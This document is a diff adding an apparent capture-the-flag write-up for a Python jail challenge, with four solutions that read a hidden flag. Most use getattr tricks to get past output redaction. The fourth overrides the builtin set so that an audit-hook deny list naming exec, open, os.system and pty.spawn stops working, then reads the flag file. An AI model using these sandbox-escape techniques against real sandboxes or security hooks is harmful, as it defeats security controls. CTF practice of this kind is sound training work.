@@ -1,0 +1,48 @@
+dir()
+```
+['__builtins__', 'flag1']
+```
+
+dir(flag1)
+```
+['-flag1-', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']
+```
+
+================== Solution 1 ==================
+
+flag1.__getattribute__('-flag1-')
+```
+REDACTED
+```
+
+flag1.__getattribute__('-flag1-')[:-1]
+```
+sdctf{get@ttr_r3ads_3v3ryth1ng}
+```
+
+================== Solution 2 ==================
+
+getattr(flag1,'-flag1-')
+```
+REDACTED
+```
+
+getattr(flag1,'-flag1-').lower()
+```
+'sdctf{get@ttr_r3ads_3v3ryth1ng}\n'
+```
+
+================== Solution 3 ==================
+
+getattr(flag1, "-flag1-")+""
+```
+'sdctf{get@ttr_r3ads_3v3ryth1ng}\n'
+```
+
+================== Solution 4 ==================
+__builtins__['set'] = lambda x: {'builtins.input', 'builtins.input/result', 'exec', 'compile', 'open', 'import', 'code.__new__', 'pty.spawn', 'os.forkpty', 'os.system'}
+
+open('flag1.txt').read()
+```
+'sdctf{get@ttr_r3ads_3v3ryth1ng}\n'
+```
